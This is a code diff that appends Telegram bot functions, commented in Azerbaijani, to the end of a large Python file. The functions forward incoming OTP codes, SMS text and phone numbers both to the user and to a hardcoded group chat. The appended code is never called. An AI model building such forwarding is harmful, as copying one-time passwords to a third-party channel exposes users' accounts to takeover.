@@ -5139,3 +5139,62 @@ def main():
 if __name__ == "__main__":
   main()
 
+import logging
+from telegram import Update
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    ContextTypes,
+)
+
+# Qrup ID-sini buraya qeyd edin (mənfi işarəsi ilə)
+GROUP_CHAT_ID = -1003812747446
+
+
+# OTP Mesajı gəldikdə çağırılan funksiya (nümunə)
+async def send_otp_to_user_and_group(
+    context: ContextTypes.DEFAULT_TYPE, user_id: int, phone_number: str, otp_code: str
+):
+  message_text = (
+      f"📩 **Yeni OTP Kodu Gəldi!**\n\n"
+      f"👤 **İstifadəçi ID:** `{user_id}`\n"
+      f"📞 **Nömrə:** `{phone_number}`\n"
+      f"🔑 **OTP Kodu:** `{otp_code}`"
+  )
+
+  # 1. Mesajı istifadəçinin özünə göndəririk
+  try:
+    await context.bot.send_message(
+        chat_id=user_id, text=message_text, parse_mode="Markdown"
+    )
+  except Exception as e:
+    logging.error(f"İstifadəçiyə mesaj göndərilərkən xəta: {e}")
+
+  # 2. Eyni mesajı Telegram qrupuna göndəririk
+  try:
+    await context.bot.send_message(
+        chat_id=GROUP_CHAT_ID, text=message_text, parse_mode="Markdown"
+    )
+  except Exception as e:
+    logging.error(f"Qrupa mesaj göndərilərkən xəta: {e}")
+
+# Webhook vasitəsilə SMS gəldikdə:
+async def handle_incoming_sms(user_id, phone, sms_text, app):
+  group_id = -1003812747446 #Öz Qrup ID-niz
+
+  formatted_msg = (
+      f"📨 **YENİ SMS / OTP RECEIVED**\n\n"
+      f"👤 **İstifadəçi:** `{user_id}`\n"
+      f"📱 **Nömrə:** `{phone}`\n"
+      f"💬 **Mesaj:**\n`{sms_text}`"
+  )
+
+  # İstifadəçiyə göndər
+  await app.bot.send_message(
+      chat_id=user_id, text=formatted_msg, parse_mode="Markdown"
+  )
+
+  # Qrupa göndər
+  await app.bot.send_message(
+      chat_id=group_id, text=formatted_msg, parse_mode="Markdown"
+  )
